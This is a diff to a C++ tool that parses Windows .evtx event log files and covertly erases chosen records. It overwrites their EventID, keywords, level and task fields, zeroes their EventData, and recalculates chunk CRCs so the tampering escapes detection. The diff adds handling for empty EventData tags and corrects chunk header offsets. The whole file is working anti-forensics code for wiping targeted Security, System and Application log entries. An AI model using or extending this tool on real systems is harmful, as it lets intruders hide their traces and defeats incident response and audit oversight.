@@ -5,7 +5,7 @@
 // 禁用padding
 #pragma pack(1)
 
-// #define DEBUG
+#define DEBUG
 
 #define EVENT_NAME_HASH 0x0CBA
 #define SYSTEM_NAME_HASH 0x546F
@@ -82,6 +82,10 @@ EVENTID | EVENTDATA | COMPUTER | LEVEL | TASK | KEYWORDS
 // table index
 WORD _table_index;
 WORD _inner_table_index; // _INNER_Template_OFS_TABLE
+
+// 记录空EventData模板的偏移量
+DWORD _empty_event_data_offset_table[ENTRY_NUMBER];
+WORD _empty_inner_table_index; 
 
 /*
 我们主要针对3个频道：Application、Security、System
@@ -253,7 +257,7 @@ DWORD64 deal_target_tag(HANDLE _file_handle, DWORD64 _current_chunk,
     return _ofs_in_template;
 }
 
-VOID iterateTag(HANDLE _file_handle, BYTE* _chunk_buffer, PTemplateInstace _template_instance,
+BOOL iterateTag(HANDLE _file_handle, BYTE* _chunk_buffer, PTemplateInstace _template_instance,
     DWORD64 _ofs_in_template, WORD _expect_table_entry, DWORD64 _current_chunk,
     WORD _end_mark) {
     while (!(_expect_table_entry ^ 0xFFFF)) {
@@ -315,6 +319,14 @@ VOID iterateTag(HANDLE _file_handle, BYTE* _chunk_buffer, PTemplateInstace _temp
             }
             // CloseStartElementToken
             _ofs_in_template += 0x1;
+            // 后续的测试发现，有些record的eventdata是一个空标签，也就是说0x2 token后面紧跟就是0x4 token
+            // 因此我们有必要进行一下判断
+            if (0x4 == *reinterpret_cast<BYTE*>(_chunk_buffer + _template_instance->_template_def_offset + _ofs_in_template)) {
+                // 我们需要把这个状态和EventData[InnerTemplate]数组关联起来
+                _empty_event_data_offset_table[_empty_inner_table_index++] = _template_instance->_template_def_offset;
+                // 返回FALSE表示遇到了空白EventData标签
+                return FALSE;
+            }
         }
         else if (!((_tag_name._name_hash ^ EVENTID_NAME_HASH) * (_tag_name._name_hash ^ USERDATA_NAME_HASH) * (_tag_name._name_hash ^ COMPUTER_NAME_HASH) * (_tag_name._name_hash ^ LEVEL_NAME_HASH) * (_tag_name._name_hash ^ TASK_NAME_HASH) * (_tag_name._name_hash ^ KEYWORDS_NAME_HASH))) {
             _ofs_in_template = deal_target_tag(_file_handle, _current_chunk, _template_instance->_template_def_offset, _ofs_in_template, &_is_reference_offset, _chunk_buffer, &_start_element, &_tag_name);
@@ -337,6 +349,7 @@ VOID iterateTag(HANDLE _file_handle, BYTE* _chunk_buffer, PTemplateInstace _temp
                 _ofs_in_template -= sizeof(TagName);
         }
     }
+    return TRUE;
 }
 
 BYTE* retrieve_value_address(BYTE* _chunk_buffer, DWORD64 _substitution_id, DWORD64 _iterate_start, DWORD64 _real_data_offset) {
@@ -456,7 +469,7 @@ int main(int argc, char* argv[]) {
         printf("[ENTER YES IF YOU WANT TO CONITNUE ANYWAY]: ");
         char _user_answer[10] = { 0 };
         scanf_s("%s", _user_answer, 10);
-        if (0!=strcmp(_user_answer, "YES")) {
+        if (0 != strcmp(_user_answer, "YES")) {
             printf("ABORT\n");
             exit(-1);
         }
@@ -565,12 +578,18 @@ int main(int argc, char* argv[]) {
             printf("[-] read evtx file failed: %x, abort...\n", GetLastError());
             return -1;
         }
-        // 0x8偏移是当前chunk中第一条record的序号，0x10偏移是当前chunk中最后一条record的序号，
-        DWORD64 _record_num = *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x10) - *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x8) + 1;
+        // 0x18偏移是当前chunk中第一条record的序号，0x20偏移是当前chunk中最后一条record的序号，
+        DWORD64 _record_num = *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x20) - *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x18) + 1;
         printf("\ttotal 0x%p records in chunk: 0x%p\n\n", reinterpret_cast<DWORD64*>(_record_num), reinterpret_cast<DWORD64*>(_current_chunk));
-        DWORD64 _last_record_sequence_number_in_current_chunk = *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x10);
+        DWORD64 _last_record_sequence_number_in_current_chunk = *reinterpret_cast<DWORD64*>(_chunk_buffer + 0x20);
         DWORD64 _record_offset_sum = 0x200;
         while (1) {
+#ifdef DEBUG
+            if (0xE2E0 == _record_offset_sum) {
+                int a = 0;
+            }
+#endif 
+
             _record_sequence_number = *reinterpret_cast<DWORD64*>(_chunk_buffer + _record_offset_sum + 0x8);
             printf("\trecord [0x%p]\n", reinterpret_cast<DWORD64*>(_record_sequence_number));
             // 我们需要把record的时间戳和length提取出来
@@ -686,6 +705,54 @@ int main(int argc, char* argv[]) {
             // 获取Keywords的地址
             printf("\t\tkeywords: 0x%p\n\n", reinterpret_cast<BYTE*>(*reinterpret_cast<DWORD64*>(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][5], _iterate_start, _real_data_offset))));
 
+            // 修改System标签的内容
+            // 如果是目标EventID，则执行下面的操作
+            if (is_condition_match(_event_id, _record_time_stamp_RAW, _target_event_id, _start_timestamp)) {
+                // 修改eventid
+                SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][0], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                DWORD _out = 0;
+                if (_Channel_Value_Table[_channel]._event_id ^ 0xFFFF)
+                    if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._event_id, 2, &_out, NULL)) {
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                        exit(-1);
+                    }
+                // 修改keywords
+                SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][5], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                _out = 0;
+                if (_Channel_Value_Table[_channel]._key_words ^ 0xFFFFFFFFFFFFFFFF)
+                    if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._key_words, 8, &_out, NULL)) {
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                        exit(-1);
+                    }
+                // 修改level
+                SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][3], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                _out = 0;
+                if (_Channel_Value_Table[_channel]._level ^ 0xFF)
+                    if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._level, 1, &_out, NULL)) {
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                        exit(-1);
+                    }
+                // 修改task
+                SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][4], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
+                _out = 0;
+                if (_Channel_Value_Table[_channel]._task ^ 0xFFFF)
+                    if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._task, 2, &_out, NULL)) {
+                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                        exit(-1);
+                    }
+                if (!_Substitution_ID_TABLE[_current_index][1]) {
+                    _already_erased_counter++;
+                    if (_already_erased_counter == _max_number) {
+                        printf("[+] all target events have been erased\n");
+                        recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
+                        printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
+                        free(_chunk_buffer);
+                        CloseHandle(_file_handle);
+                        printf("[+] DONE!\n");
+                        exit(0);
+                    }
+                }
+            }
 
             // 解析InnerTemplate（如果存在我们感兴趣的innertamplate的话）
             // InstanceDataDef实际数据后面的部分是填充，可以直接忽略
@@ -696,7 +763,10 @@ int main(int argc, char* argv[]) {
             if (_Substitution_ID_TABLE[_current_index][1]) {
                 // fragment header
                 DWORD64 _ofs_in_event_data = 0;
-                _ofs_in_event_data += 0x4;
+                // 后续测试发现这里并不总会出现一个fragmentheader(0F 01 01 00)
+                // 所以需要进行一下判断
+                if(0x1010F == *reinterpret_cast<DWORD*>(_chunk_buffer + _event_data_addr + _ofs_in_event_data))
+                    _ofs_in_event_data += 0x4;
                 // 正常情况下都是模板token，不过判断一下也无妨
                 if (0xc != *reinterpret_cast<BYTE*>(_chunk_buffer + _event_data_addr + _ofs_in_event_data)) {
                     printf("[NO INNER TEMPLATE] oops! something I didn't expected\n");
@@ -714,6 +784,16 @@ int main(int argc, char* argv[]) {
                             break;
                         }
                     }
+                    // 检查该offset是否已经被标记为空EventData
+                    BOOL _is_empty_template = FALSE;
+                    for (int i = 0; i < ENTRY_NUMBER; i++) {
+                        if (_empty_event_data_offset_table[i] == _inner_template_instance._template_def_offset) {
+                            _is_empty_template = TRUE;
+                            break;
+                        }
+                    }
+                    if (_is_empty_template)
+                        break;
                 }
                 else {
                     TemplateDef _inner_template_definition = *reinterpret_cast<PTemplateDef>(_chunk_buffer + _inner_template_instance._template_def_offset);
@@ -728,96 +808,79 @@ int main(int argc, char* argv[]) {
                 // 0x4  fragment header
                 _ofs_in_template += 4;
                 // 遍历所有的tag，修改替换类型为可选替换
-                iterateTag(_file_handle, _chunk_buffer, &_inner_template_instance, _ofs_in_template, _expect_table_entry, _current_chunk, CHILD_END);
-
-                // 如果是目标EventID，则执行下面的操作
-                if (is_condition_match(_event_id, _record_time_stamp_RAW, _target_event_id, _start_timestamp)) {
-                    // 修改eventid
-                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][0], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
-                    DWORD _out = 0;
-                    if (_Channel_Value_Table[_channel]._event_id ^ 0xFFFF)
-                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._event_id, 2, &_out, NULL)) {
-                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                            exit(-1);
+                if (!iterateTag(_file_handle, _chunk_buffer, &_inner_template_instance, _ofs_in_template, _expect_table_entry, _current_chunk, CHILD_END)) {
+                    // 遇到了空白EventData标签
+                    // 检查是否符合修改条件并调整_already_erased_counter的值
+                    if (is_condition_match(_event_id, _record_time_stamp_RAW, _target_event_id, _start_timestamp)) {
+                        _already_erased_counter++;
+                        if (_already_erased_counter == _max_number) {
+                            printf("[+] all target events have been erased\n");
+                            recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
+                            printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
+                            free(_chunk_buffer);
+                            CloseHandle(_file_handle);
+                            printf("[+] DONE!\n");
+                            exit(0);
                         }
-                    // 修改keywords
-                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][5], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
-                    _out = 0;
-                    if (_Channel_Value_Table[_channel]._key_words ^ 0xFFFFFFFFFFFFFFFF)
-                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._key_words, 8, &_out, NULL)) {
-                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                            exit(-1);
-                        }
-                    // 修改level
-                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][3], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
-                    _out = 0;
-                    if (_Channel_Value_Table[_channel]._level ^ 0xFF)
-                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._level, 1, &_out, NULL)) {
-                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                            exit(-1);
-                        }
-                    // 修改task
-                    SetFilePointer(_file_handle, (LONG)(retrieve_value_address(_chunk_buffer, _Substitution_ID_TABLE[_current_index][4], _iterate_start, _real_data_offset) - _chunk_buffer + 0x1000 + 0x10000 * _current_chunk), NULL, FILE_BEGIN);
-                    _out = 0;
-                    if (_Channel_Value_Table[_channel]._task ^ 0xFFFF)
-                        if (!WriteFile(_file_handle, &_Channel_Value_Table[_channel]._task, 2, &_out, NULL)) {
-                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                            exit(-1);
-                        }
-
-                    // 现在我们需要处理data部分了
-                    DWORD _data_counter = *reinterpret_cast<DWORD*>(_chunk_buffer + _template_instance_data_offset);
-                    // 获取原始数据的长度
-                    DWORD _ori_data_len = 0;
-                    DWORD64 _counter = 0;
-                    _iterate_start = _template_instance_data_offset + 0x4;
-                    while (1) {
-                        if (_counter == _data_counter)
-                            break;
-                        _ori_data_len += (*reinterpret_cast<DWORD*>(_chunk_buffer + _iterate_start + (DWORD64)4 * _counter++)) & 0xFF;
                     }
-                    // 我们先把def部分清空
+                }
+                else {
+                    // 如果是目标EventID，则执行下面的操作
+                    if (is_condition_match(_event_id, _record_time_stamp_RAW, _target_event_id, _start_timestamp)) {
+                        // 现在我们需要处理data部分了
+                        DWORD _data_counter = *reinterpret_cast<DWORD*>(_chunk_buffer + _template_instance_data_offset);
+                        // 获取原始数据的长度
+                        DWORD _ori_data_len = 0;
+                        DWORD64 _counter = 0;
+                        _iterate_start = _template_instance_data_offset + 0x4;
+                        while (1) {
+                            if (_counter == _data_counter)
+                                break;
+                            _ori_data_len += (*reinterpret_cast<DWORD*>(_chunk_buffer + _iterate_start + (DWORD64)4 * _counter++)) & 0xFF;
+                        }
+                        // 我们先把def部分清空
 #ifdef DEBUG
-                    printf("[DEBUG] file pointer: 0x%p\n", reinterpret_cast<DWORD*>(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4));
+                        printf("[DEBUG] file pointer: 0x%p\n", reinterpret_cast<DWORD*>(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4));
 #endif 
 
-                    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4), NULL, FILE_BEGIN);
-                    BYTE* _padding = (BYTE*)malloc(_ori_data_len);
-                    if (0 == _padding) {
-                        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
-                        exit(-1);
-                    }
-                    _out = 0;
-                    ZeroMemory(_padding, _ori_data_len);
-                    if (!WriteFile(_file_handle, _padding, _data_counter * 4, &_out, NULL)) {
-                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                        exit(-1);
-                    }
-                    free(_padding);
-                    // 然后把data部分清空
-                    SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4 + 4 * (DWORD64)_data_counter), NULL, FILE_BEGIN);
-                    _out = 0;
-                    _padding = (BYTE*)malloc(_ori_data_len);
-                    if (0 == _padding) {
-                        printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
-                        exit(-1);
-                    }
-                    ZeroMemory(_padding, _ori_data_len);
-                    if (!WriteFile(_file_handle, _padding, _ori_data_len, &_out, NULL)) {
-                        printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
-                        exit(-1);
-                    }
-                    free(_padding);
+                        SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4), NULL, FILE_BEGIN);
+                        BYTE* _padding = (BYTE*)malloc(_ori_data_len);
+                        if (0 == _padding) {
+                            printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                        _out = 0;
+                        ZeroMemory(_padding, _ori_data_len);
+                        if (!WriteFile(_file_handle, _padding, _data_counter * 4, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                        free(_padding);
+                        // 然后把data部分清空
+                        SetFilePointer(_file_handle, (LONG)(0x1000 + 0x10000 * _current_chunk + _template_instance_data_offset + 0x4 + 4 * (DWORD64)_data_counter), NULL, FILE_BEGIN);
+                        _out = 0;
+                        _padding = (BYTE*)malloc(_ori_data_len);
+                        if (0 == _padding) {
+                            printf("[-] odd! memory allocate failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                        ZeroMemory(_padding, _ori_data_len);
+                        if (!WriteFile(_file_handle, _padding, _ori_data_len, &_out, NULL)) {
+                            printf("[-] write evtx file failed: %x, abort...\n", GetLastError());
+                            exit(-1);
+                        }
+                        free(_padding);
 
-                    _already_erased_counter++;
-                    if (_already_erased_counter == _max_number) {
-                        printf("[+] all target events have been erased\n");
-                        recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
-                        printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
-                        free(_chunk_buffer);
-                        CloseHandle(_file_handle);
-                        printf("[+] DONE!\n");
-                        exit(0);
+                        _already_erased_counter++;
+                        if (_already_erased_counter == _max_number) {
+                            printf("[+] all target events have been erased\n");
+                            recalculate_crc(_file_handle, NT_RtlComputeCrc32, _chunk_buffer, _current_chunk);
+                            printf("[+] total 0x%p erased\n\n", reinterpret_cast<DWORD*>((DWORD64)_already_erased_counter));
+                            free(_chunk_buffer);
+                            CloseHandle(_file_handle);
+                            printf("[+] DONE!\n");
+                            exit(0);
+                        }
                     }
                 }
             }
